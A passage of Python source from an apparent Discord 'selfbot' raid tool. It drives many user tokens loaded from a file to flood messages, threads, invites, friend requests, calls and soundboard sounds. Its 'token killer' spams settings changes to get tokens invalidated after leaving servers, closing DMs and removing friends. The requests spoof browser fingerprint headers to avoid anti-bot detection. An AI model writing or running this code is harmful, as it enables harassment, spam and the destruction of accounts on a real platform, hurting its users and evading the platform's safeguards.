                console_logger(f"{masked_token} - Invalid token (401) - Cannot get guilds", "error")
            else:
                console_logger(f"{masked_token} - Failed to get guilds: {guilds_response.status_code}", "warning")
            
            time.sleep(random.uniform(2.0, 4.0))
            
        except Exception as e:
            console_logger(f"{masked_token} - Guild leave error: {str(e)}", "warning")

    if close_dms:
        try:
            if 'session' not in locals():
                session = requests.Session()
                session.headers.update(headers)

            dm_response = session.get(
                "https://discord.com/api/v9/users/@me/channels",
                timeout=30
            )
            
            if dm_response.status_code == 200:
                dms = dm_response.json()
                
                dm_closed_count = 0
                for dm in dms:
                    try:
                        channel_id = dm['id']
                        channel_type = dm.get('type', 0)
                        
                        if channel_type in [1, 3]:
                            close_url = f"https://discord.com/api/v9/channels/{channel_id}?silent=false"
                            
                            close_response = session.delete(close_url, timeout=30)
                            
                            if close_response.status_code == 200:
                                dm_closed_count += 1
                            elif close_response.status_code == 403:
                                console_logger(f"{masked_token} - Cannot close DM {channel_id} (permissions)", "warning")
                            else:
                                console_logger(f"{masked_token} - Failed to close DM {channel_id}: {close_response.status_code}", "warning")
                            
                            time.sleep(random.uniform(0.5, 1.5))
                        
                    except Exception as e:
                        console_logger(f"{masked_token} - Error closing DM {dm.get('id', 'Unknown')}: {str(e)}", "warning")

            elif dm_response.status_code == 401:
                console_logger(f"{masked_token} - Invalid token (401) - Cannot get DMs", "error")
            else:
                console_logger(f"{masked_token} - Failed to get DMs: {dm_response.status_code}", "warning")
            
            time.sleep(random.uniform(2.0, 4.0))
            
        except Exception as e:
            console_logger(f"{masked_token} - DM close error: {str(e)}", "warning")
    
    if remove_friends:
        try:
            minimal_headers = {
                "Authorization": token,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
            }
            
            friends_response = requests.get(
                "https://discord.com/api/v9/users/@me/relationships",
                headers=minimal_headers,
                timeout=30  
            )
            
            if friends_response.status_code == 200:
                relationships = friends_response.json()
                friends = [rel for rel in relationships if rel.get('type') == 1]  
                
                friends_removed_count = 0
                for friend in friends:
                    try:
                        user_id = friend['id']
                        username = friend.get('user', {}).get('username', 'Unknown')
                        
                        remove_headers = {
                            "Authorization": token,
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
                        }
                        
                        remove_url = f"https://discord.com/api/v9/users/@me/relationships/{user_id}"
                        
                        remove_response = requests.delete(remove_url, headers=remove_headers, timeout=30)
                        
                        if remove_response.status_code == 204:
                            friends_removed_count += 1
                        elif remove_response.status_code == 403:
                            console_logger(f"{masked_token} - Cannot remove friend {username} (permissions)", "warning")
                        elif remove_response.status_code == 404:
                            console_logger(f"{masked_token} - Friend {username} not found (404)", "warning")
                        else:
                            console_logger(f"{masked_token} - Failed to remove friend {username}: {remove_response.status_code}", "warning")
                        
                        time.sleep(random.uniform(0.5, 1.5))
                        
                    except Exception as e:
                        console_logger(f"{masked_token} - Error removing friend {friend.get('user', {}).get('username', 'Unknown')}: {str(e)}", "warning")
                
            elif friends_response.status_code == 401:
                console_logger(f"{masked_token} - Invalid token (401) - Cannot get friends", "error")
            elif friends_response.status_code == 400:
                console_logger(f"{masked_token} - Bad request (400) - API may not support this token type", "warning")
            elif friends_response.status_code == 403:
                console_logger(f"{masked_token} - Forbidden (403) - No permission to access relationships", "warning")
            else:
                console_logger(f"{masked_token} - Failed to get friends: {friends_response.status_code}", "warning")
            
            time.sleep(random.uniform(2.0, 4.0))
            
        except Exception as e:
            console_logger(f"{masked_token} - Friend removal error: {str(e)}", "warning")
    
    try:
        if 'session' not in locals():
            session = requests.Session()
            session.headers.update(headers)
        
        for cycle in range(spam_cycles):
            setting = {
                'theme': random.choice(themes),
                'locale': random.choice(locales)
            }
            
            response = session.patch(
                "https://discord.com/api/v7/users/@me/settings",
                json=setting,
                timeout=10
            )
            
            if response.status_code == 200:
                if cycle % 20 == 0:  
                    pass
            elif response.status_code == 401:
                console_logger(f"{masked_token} - Token invalidated (401) - Mission accomplished!", "success")
                with lock:
                    success_count[0] += 1
                break
            elif response.status_code == 403:
                console_logger(f"{masked_token} - Account restricted (403) - Possible token kill success", "success")
                with lock:
                    success_count[0] += 1
                break
            elif response.status_code == 400:
                console_logger(f"{masked_token} - Bad request (400) - Trying simpler approach", "warning")
                simple_setting = {'theme': random.choice(themes)}
                simple_response = session.patch(
                    "https://discord.com/api/v7/users/@me/settings",
                    json=simple_setting,
                    timeout=10
                )
            elif response.status_code == 429:
                retry_after = response.headers.get('Retry-After', '2')
                console_logger(f"{masked_token} - Rate limited! Waiting {retry_after}s...", "warning")
                time.sleep(int(retry_after) + random.uniform(0.5, 1.5))

            time.sleep(random.uniform(0.005, 0.02))

        with lock:
            failed_count[0] += 1
        
        session.close()
            
    except requests.exceptions.Timeout:
        console_logger(f"{masked_token} - Request timeout - Continuing", "error")
        with lock:
            failed_count[0] += 1
    except requests.exceptions.ConnectionError:
        console_logger(f"{masked_token} - Connection error - Token may be killed", "success")
        with lock:
            success_count[0] += 1
    except Exception as e:
        console_logger(f"{masked_token} - Unexpected error - {str(e)}", "error")
        with lock:
            failed_count[0] += 1

def token_killer_multi(leave_all_guilds=False, close_dms=False, remove_friends=False):
    tokens = load_tokens_from_file()
    
    if not tokens:
        console_logger("No tokens found to process", "error")
        return

    success_count = [0] 
    failed_count = [0]
    lock = threading.Lock()
    
    def background_killer():
        threads = []
        
        for i, token in enumerate(tokens):
            thread = threading.Thread(
                target=token_killer_worker,
                args=(token, leave_all_guilds, close_dms, remove_friends, success_count, failed_count, lock),
                daemon=True
            )
            threads.append(thread)
            thread.start()
            
            time.sleep(random.uniform(0.1, 0.3))
        
        for thread in threads:
            thread.join()
        
    background_thread = threading.Thread(target=background_killer, daemon=True)
    background_thread.start()
    
    
def token_killer_single(token):
    url = "https://discord.com/api/v7/users/@me/settings"
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    }
    
    themes = ['dark', 'light']
    locales = ['ja', 'zh-TW', 'ko', 'zh-CN', 'en-US', 'fr', 'de', 'es-ES', 'ru']
    
    try:
        spam_cycles = 75
        
        for cycle in range(spam_cycles):
            setting = {
                'theme': random.choice(themes),
                'locale': random.choice(locales)
            }
            
            response = requests.patch(url, headers=headers, json=setting, timeout=10)
            
            if response.status_code == 401:
                console_logger("Token successfully killed (401 Unauthorized)!", "success")
                return True
            elif response.status_code == 403:
                console_logger("Account restricted (403) - Token likely killed!", "success")
                return True
            elif response.status_code == 200:
                if cycle % 15 == 0:
                    console_logger(f"Spam cycle {cycle+1}/{spam_cycles} - Continuing...", "info")
            elif response.status_code == 400:
                console_logger(f"Bad request (400) - Invalid settings format", "error")
                return False
            
            time.sleep(random.uniform(0.01, 0.03))
        
        return False
        
    except Exception as e:
        console_logger(f"Error during token killing: {str(e)}", "error")
        return False

# END

# Friend Adding Function
def friend_adder_multi(username):
    tokens = load_tokens_from_file()
    
    if not tokens:
        print(f"[ERROR] No tokens found in DATA/Value.yml")
        return
    
    success_count = 0
    failed_count = 0
    
    def send_friend_request(token, username):
        try:
            if "#" in username:
                user_parts = username.split("#")
                payload = {
                    "username": user_parts[0],
                    "discriminator": user_parts[1]
                }
            else:
                payload = {
                    "username": username,
                    "discriminator": None
                }
            
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'X-Context-Properties': 'eyJsb2NhdGlvbiI6IkFkZCBGcmllbmQifQ==',
                'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImhhc19jbGllbnRfbW9kcyI6ZmFsc2UsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjE0Mi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzE0Mi4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTQyLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6NDM2MjMwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJjbGllbnRfbGF1bmNoX2lkIjoiZjdjNDI5OTAtMjExNS00YTNjLTkxMGMtMGMyNmMwMTcwMzA1IiwibGF1bmNoX3NpZ25hdHVyZSI6Ijg1MTljZmU4LTAyMDEtNDI0MC04NDE0LWQzYTkwODE3YjA4YiIsImNsaWVudF9oZWFydGJlYXRfc2Vzc2lvbl9pZCI6IjNlNDRmYzRlLTZlMzMtNGNkOS05OTkzLWVmMjE0Zjc2NWY0NCIsImNsaWVudF9hcHBfc3RhdGUiOiJmb2N1c2VkIn0=',
                'X-Discord-Locale': 'en-GB',
                'X-Discord-Timezone': 'Asia/Bangkok',
                'X-Debug-Options': 'bugReporterEnabled',
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/channels/@me',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'DNT': '1',
                'Sec-GPC': '1'
            }
            
            response = requests.post(
                'https://discord.com/api/v9/users/@me/relationships',
                headers=headers,
                json=payload,
                timeout=10
            )
            
            match response.status_code:
                case 204:
                    print(f"[{time.strftime('%H:%M:%S')}] - {token[:10]}**** - Successfully sent friend request to {username}!")
                    return True
                case 400:
                    try:
                        error_data = response.json()
                        if 'captcha_key' in error_data:
                            print(f"[{time.strftime('%H:%M:%S')}] - {token[:10]}**** - CAPTCHA required (Discord anti-bot protection)")
                        else:
                            error_msg = error_data.get('message', 'Bad request')
                            print(f"[{time.strftime('%H:%M:%S')}] - {token[:10]}**** - Bad request: {error_msg}")
                    except:
                        print(f"[{time.strftime('%H:%M:%S')}] - {token[:10]}**** - Bad request (400)")
                    return False
                case 401:
                    print(f"[{time.strftime('%H:%M:%S')}] - {token[:10]}**** - Invalid token (401)")
                    return False
                case 403:
                    print(f"[{time.strftime('%H:%M:%S')}] - {token[:10]}**** - Forbidden (403)")
                    return False
                case 429:
                    try:
                        retry_after = response.headers.get('Retry-After', '60')
                        print(f"[{time.strftime('%H:%M:%S')}] - {token[:10]}**** - Rate limited! Wait {retry_after}s")
                    except:
                        print(f"[{time.strftime('%H:%M:%S')}] - {token[:10]}**** - Rate limited (429)")
                    return False
                case _:
                    try:
                        error_data = response.json()
                        print(f"[{time.strftime('%H:%M:%S')}] - {token[:10]}**** - Failed ({response.status_code}): {error_data}")
                    except:
                        print(f"[{time.strftime('%H:%M:%S')}] - {token[:10]}**** - Failed ({response.status_code})")
                    return False
                
        except Exception as e:
            print(f"[{time.strftime('%H:%M:%S')}] - {token[:10]}**** - Error: {str(e)}")
            return False
    
    print(f"[{time.strftime('%H:%M:%S')}] - Sending friend requests to '{username}' from all tokens...")
    
    threads = []
    results = []
    
    def worker(token, idx):
        print(f"[{time.strftime('%H:%M:%S')}] - [{idx}/{len(tokens)}] Adding friend with {token[:10]}****...")
        result = send_friend_request(token, username)
        results.append(result)
    
    for i, token in enumerate(tokens, 1):
        thread = threading.Thread(target=worker, args=(token, i))
        thread.daemon = True
        thread.start()
        threads.append(thread)
        time.sleep(random.uniform(3.0, 8.0)) 
    
    for thread in threads:
        thread.join()
    
    success_count = sum(results)
    failed_count = len(results) - success_count
    
    print(f"[{time.strftime('%H:%M:%S')}] - Friend adding completed! Success: {success_count}, Failed: {failed_count}")


def friadd(a):
    a = ("A")
    Main()


# Thread Create Spammer
def thread_spammer_multi(channel_id, thread_name, thread_count=50):
    tokens = load_tokens_from_file()
    if not tokens:
        console_logger("No tokens found", "error")
        return False

    success_count = 0
    failed_count = 0

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    ]

    def generate_super_properties():
        os_versions = ["10", "11"]
        browser_versions = ["142.0", "131.0.0.0", "130.0.0.0"]
        build_numbers = [438971, 438500, 438000, 437500]
        
        super_props = {
            "os": "Windows",
            "browser": random.choice(["Firefox", "Chrome"]),
            "device": "",
            "system_locale": "en-US",
            "has_client_mods": False,
            "browser_user_agent": random.choice(user_agents),
            "browser_version": random.choice(browser_versions),
            "os_version": random.choice(os_versions),
            "referrer": "",
            "referring_domain": "",
            "referrer_current": "",
            "referring_domain_current": "",
            "release_channel": "stable",
            "client_build_number": random.choice(build_numbers),
            "client_event_source": None,
            "client_launch_id": f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
            "launch_signature": f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
            "client_app_state": "focused",
            "client_heartbeat_session_id": f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
        }
        return base64.b64encode(json.dumps(super_props, separators=(',', ':')).encode()).decode()

    def thread_worker(token, thread_number):
        nonlocal success_count, failed_count
        masked_token = mask_token(token)
        
        url = f"https://discord.com/api/v9/channels/{channel_id}/threads?use_nested_fields=true"
        user_agent = random.choice(user_agents)
        super_properties = generate_super_properties()
        
        unique_thread_name = f"{thread_name} {thread_number}-{random_string(4)}"
        
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": user_agent,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Origin": "https://discord.com",
            "Referer": f"https://discord.com/channels/@me/{channel_id}",
            "Sec-CH-UA": '"Not;A=Brand";v="99", "Google Chrome";v="131", "Chromium";v="131"',
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "X-Super-Properties": super_properties,
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Asia/Bangkok",
            "X-Debug-Options": "bugReporterEnabled",
            "DNT": "1",
            "Connection": "keep-alive"
        }
        
        payload = {
            "name": unique_thread_name,
            "auto_archive_duration": 4320,
            "applied_tags": [],
            "message": {
                "content": f"{unique_thread_name}"
            }
        }
        
        try:
            session = requests.Session()
            session.headers.update(headers)
            
            response = session.post(url, json=payload, timeout=15)
            
            if response.status_code == 201:
                success_count += 1
                console_logger(f"{masked_token} - Thread '{unique_thread_name}' created successfully", "success")
            elif response.status_code == 401:
                console_logger(f"{masked_token} - Invalid token (401)", "error")
                failed_count += 1
            elif response.status_code == 403:
                console_logger(f"{masked_token} - No permission (403)", "error")
                failed_count += 1
            elif response.status_code == 404:
                console_logger(f"{masked_token} - Channel not found (404)", "error")
                failed_count += 1
            elif response.status_code == 429:
                retry_after = response.headers.get('Retry-After', '10')
                console_logger(f"{masked_token} - Rate limited! Waiting {retry_after}s...", "warning")
                time.sleep(int(retry_after) + random.uniform(1, 3))
                failed_count += 1
            elif response.status_code == 400:
                try:
                    error_data = response.json()
                    error_message = error_data.get('message', 'Bad request')
                    console_logger(f"{masked_token} - Bad request (400) - {error_message}", "error")
                except:
                    console_logger(f"{masked_token} - Bad request (400)", "error")
                failed_count += 1
            else:
                console_logger(f"{masked_token} - Failed with status {response.status_code}", "error")
                failed_count += 1
                
            session.close()
                
        except requests.exceptions.Timeout:
            console_logger(f"{masked_token} - Request timeout", "error")
            failed_count += 1
        except requests.exceptions.ConnectionError:
            console_logger(f"{masked_token} - Connection error", "error")
            failed_count += 1
        except Exception as e:
            console_logger(f"{masked_token} - Unexpected error - {str(e)}", "error")
            failed_count += 1
    threads = []
    thread_number = 1
    
    for i in range(thread_count):
        token = tokens[i % len(tokens)] 
        thread = threading.Thread(target=thread_worker, args=(token, thread_number), daemon=True)
        threads.append(thread)
        thread.start()
        thread_number += 1

        time.sleep(random.uniform(1.0, 3.0))
    
    for thread in threads:
        thread.join()
    
    console_logger(f"Thread spam completed! Success: {success_count}, Failed: {failed_count}", "info")
    return True

def message_spammer_worker(token, channel_id, message, delay_range, stop_event):
    masked_token = mask_token(token)
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    ]
    
    user_agent = random.choice(user_agents)
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": user_agent,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Origin": "https://discord.com",
        "Referer": f"https://discord.com/channels/@me",
        "Sec-CH-UA": '"Google Chrome";v="131", "Not;A=Brand";v="99"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-Discord-Locale": "en-US",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTMxLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjQzNTM5NiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    }
    
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
    
    message_count = 0
    consecutive_failures = 0
    max_consecutive_failures = 5
    
    while not stop_event.is_set():
        try:
            current_message = message
            if "{random}" in message:
                random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
                current_message = message.replace("{random}", random_str)
            
            payload = {
                "content": current_message,
                "nonce": str(random.randint(100000000000000000, 999999999999999999)),
                "tts": False
            }
            
            response = requests.post(url, headers=headers, json=payload, timeout=30)
            
            if response.status_code == 200:
                message_count += 1
                consecutive_failures = 0
                
            elif response.status_code == 401:
                console_logger(f"{masked_token} - Invalid token (401) - Stopping spam", "error")
                break
                
            elif response.status_code == 403:
                console_logger(f"{masked_token} - No permission to send messages (403) - Stopping spam", "error")
                break
                
            elif response.status_code == 404:
                console_logger(f"{masked_token} - Channel not found (404) - Stopping spam", "error")
                break
                
            elif response.status_code == 429:
                try:
                    retry_after = response.headers.get('Retry-After', '5')
                    retry_time = float(retry_after) + random.uniform(1, 3)
                    console_logger(f"{masked_token} - Rate limited! Waiting {retry_time:.1f}s...", "warning")
                    
                    for _ in range(int(retry_time * 10)):
                        if stop_event.is_set():
                            return
                        time.sleep(0.1)
                    
                except ValueError:
                    time.sleep(random.uniform(5, 10))
                    
            elif response.status_code == 400:
                try:
                    error_data = response.json()
                    error_msg = error_data.get('message', 'Bad request')
                    console_logger(f"{masked_token} - Bad request (400): {error_msg}", "error")
                except:
                    console_logger(f"{masked_token} - Bad request (400)", "error")
                consecutive_failures += 1
                
            else:
                console_logger(f"{masked_token} - Failed to send message: {response.status_code}", "error")
                consecutive_failures += 1

            if consecutive_failures >= max_consecutive_failures:
                console_logger(f"{masked_token} - Too many failures, stopping spam", "error")
                break

            if not stop_event.is_set():
                delay = random.uniform(delay_range[0], delay_range[1])
                for _ in range(int(delay * 10)):
                    if stop_event.is_set():
                        return
                    time.sleep(0.1)
                    
        except requests.exceptions.Timeout:
            console_logger(f"{masked_token} - Request timeout", "error")
            consecutive_failures += 1
        except requests.exceptions.ConnectionError:
            console_logger(f"{masked_token} - Connection error", "error")
            consecutive_failures += 1
        except Exception as e:
            console_logger(f"{masked_token} - Unexpected error: {str(e)}", "error")
            consecutive_failures += 1
        
        if consecutive_failures > 0:
            time.sleep(random.uniform(1, 3))

def message_spammer_multi(channel_id, message, delay_min=1.0, delay_max=3.0):
    global spam_threads, spam_active
    
    tokens = load_tokens_from_file()
    if not tokens:
        console_logger("No tokens found to process", "error")
        return False
    
    if spam_active:
        console_logger("Message spam is already running! Stop it first before starting new spam.", "warning")
        return False
    
    spam_active = True
    spam_threads = []
    stop_event = threading.Event()
    
    def background_spammer():
        for i, token in enumerate(tokens):
            if stop_event.is_set():
                break
                
            thread = threading.Thread(
                target=message_spammer_worker,
                args=(token, channel_id, message, (delay_min, delay_max), stop_event),
                daemon=True
            )
            thread.start()
            spam_threads.append((thread, stop_event))
            
            time.sleep(random.uniform(0.5, 2.0))
            
        for thread, _ in spam_threads:
            thread.join()
        
        global spam_active
        spam_active = False
        console_logger("Message spam stopped", "info")
    
    background_thread = threading.Thread(target=background_spammer, daemon=True)
    background_thread.start()
    
    return True

def stop_message_spam():
    global spam_threads, spam_active
    
    if not spam_active:
        console_logger("No active message spam to stop", "warning")
        return False
    
    console_logger("Stopping message spam...", "info")

    for thread, stop_event in spam_threads:
        stop_event.set()
        
    for thread, stop_event in spam_threads:
        thread.join(timeout=5.0)
    
    spam_threads = []
    spam_active = False
    
    console_logger("Message spam stopped successfully", "success")
    return True

# END



####

# # # #

def handle_server_joiner():
    clear_console()
    print(dopasdkw)
    
    input(f"> under working")

def handle_token_checker():
    clear_console()
    print(dopasdkw)
    
    console_logger("This will validate all tokens and remove invalid ones from the YAML file", "warning")
    console_logger("Invalid tokens include: expired, banned, locked, or malformed tokens", "info")
    
    confirm = input("\nProceed with token validation? (y/n): ").strip().lower()
    
    if confirm in ['y', 'yes']:
        token_checker_multi()
    else:
        console_logger("Token checking cancelled", "info")
    
    input(f"> ")

def validate_discord_global_name(nickname):
    if not nickname or not nickname.strip():
        return True, "Empty nickname will clear the global name"
    
    nickname = nickname.strip()
    
    if len(nickname) < 2:
        return False, "Global name must be at least 2 characters long"
    
    if len(nickname) > 32:
        return False, "Global name cannot exceed 32 characters"
    
    invalid_chars = ['@', '#', ':', '`', '```', 'discord']
    for char in invalid_chars[:3]:
        if char in nickname:
            return False, f"Global name cannot contain '{char}'"
    
    if 'discord' in nickname.lower():
        return False, "Global name cannot contain 'discord'"
    
    if nickname.isdigit():
        return False, "Global name cannot be only numbers"
    
    if nickname.startswith(' ') or nickname.endswith(' '):
        return False, "Global name cannot start or end with spaces"

    if '  ' in nickname:
        return False, "Global name cannot contain consecutive spaces"
    
    problematic_chars = ['\n', '\r', '\t', '\0']
    for char in problematic_chars:
        if char in nickname:
            return False, "Global name contains invalid characters"
    
    return True, "Valid global name"

def handle_nickname_changer():
    clear_console()
    print(dopasdkw)
    
    console_logger("Choose nickname change type:", "info")
    console_logger("1. Global Name (appears everywhere on Discord)", "info")
    console_logger("2. Server Nickname (only in specific server)", "info")
    
    choice = input("Choice (1 or 2) > ").strip()
    
    if choice == "1":
        new_nickname = input(f"New Global Name > ")
        
        is_valid, message = validate_discord_global_name(new_nickname)
        
        if not is_valid:
            console_logger(f"Invalid global name: {message}", "error")
            console_logger("Discord global name rules:", "info")
            console_logger("- Must be 2-32 characters long", "info")
            console_logger("- Cannot be only numbers", "info") 
            console_logger("- Cannot contain @, #, : or 'discord'", "info")
            console_logger("- Cannot start/end with spaces or have consecutive spaces", "info")
            input("\n> ")
            return
        
        console_logger(f"Setting global name to: '{new_nickname.strip() if new_nickname.strip() else '(empty - will clear nickname)'}'", "info")
        nickname_changer_multi(new_nickname)
        
    elif choice == "2":
        guild_id = input("Server/Guild ID > ").strip()
        if not guild_id.isdigit():
            console_logger("Invalid server ID. Please enter a numeric Discord server ID", "error")
            input("\n> ")
            return
        
        new_nick = input("New Server Nickname > ").strip()
        if len(new_nick) > 32:
            console_logger("Server nickname cannot exceed 32 characters", "error")
            input("\n> ")
            return
        
        console_logger(f"Setting server nickname to: '{new_nick}' in server {guild_id}", "info")
        server_nickname_changer_multi(guild_id, new_nick)
        
    else:
        console_logger("Invalid choice. Please select 1 or 2", "error")
        input("\n> ")
        return
    
    input(f"> ")

def handle_bio_changer():
    clear_console()
    print(dopasdkw)
    new_bio = input(f"Bio > ")
    
    if not new_bio.strip():
        console_logger("Bio cannot be empty", "error")
        input("\n> ")
        return

    bio_changer_multi(new_bio)
    
    input(f"> ")

def handle_friend_adder():
    clear_console()
    print(dopasdkw)

    a = input("Username: ")
    
    friadd(a)


    input(f"> ")


def handle_call_spammer():
    clear_console()
    print(dopasdkw) 

    adada = input("ID >  ").strip()
    while not adada.isdigit():
        adada = input("Invalid ID. Please enter a numeric Discord user ID: ").strip()
    call_user_multi(adada, times=1)

    input(f"> ")
    
def handle_Join_VoiceChannel():
    clear_console()
    print(dopasdkw) 

    w9iajodksdw = input("Channel ID > ").strip()
    
    if not w9iajodksdw.isdigit():
        console_logger("Invalid channel ID. Please enter a numeric Discord channel ID", "error")
        input("\n> ")
        return
    
    join_voice_channel_multi(w9iajodksdw)

    input(f"> ")

def handle_disconnect_voice():
    clear_console()
    print(dopasdkw)
    
    if len(active_voice_connections) == 0:
        console_logger("No active voice connections to disconnect", "warning")
    else:
        console_logger(f"Disconnecting {len(active_voice_connections)} active voice connections...", "info")
        disconnect_all_voice()
        console_logger("All voice connections disconnected", "success")
    
    input(f"> ")

def handle_soundboard_spam():
    clear_console()
    print(dopasdkw)
    
    if len(active_voice_connections) == 0:
        console_logger("No active voice connections found! Please join a voice channel first (Option 9)", "error")
        input("\n> ")
        return

    connected_channels = [conn['channel_id'] for conn in active_voice_connections]
    for channel_id in connected_channels:
        pass
    
    console_logger("Starting continuous soundboard spam (Press Ctrl+C to stop)...", "warning")
    
    try:
        soundboard_spam_continuous(connected_channels)
    except KeyboardInterrupt:
        console_logger("Soundboard spam stopped by user", "info")
    
    input(f"> ")


def handle_invite_spam():
    clear_console()
    print(dopasdkw)
    
    waudjisodwad = input("Guild ID > ").strip()
    
    if not waudjisodwad.isdigit():
        console_logger("Invalid Guild ID. Please enter a numeric Discord guild ID", "error")
        input("\n> ")
        return
    

    try:
        invite_count = int(input("Number of invites per token (default 5) > ").strip() or "5")
        if invite_count < 1 or invite_count > 50:
            console_logger("Invalid invite count. Using default of 5", "warning")
            invite_count = 5
    except ValueError:
        console_logger("Invalid number. Using default of 5", "warning")
        invite_count = 5
    
    tokens = load_tokens_from_file()
    if not tokens:
        console_logger("No tokens found to process", "error")
        input("\n> ")
        return
        
    success_count = 0
    failed_count = 0
    total_invites_created = 0
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    ]
    
    first_token = tokens[0]
    headers = {
        "Authorization": first_token,
        "Content-Type": "application/json",
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Origin": "https://discord.com",
        "Referer": f"https://discord.com/channels/{waudjisodwad}",
        "X-Discord-Locale": "en-US"
    }
    
    try:
        guild_response = requests.get(
            f"https://discord.com/api/v9/guilds/{waudjisodwad}/channels",
            headers=headers,
            timeout=30
        )
        
        if guild_response.status_code != 200:
            console_logger(f"Failed to get guild channels: {guild_response.status_code}", "error")
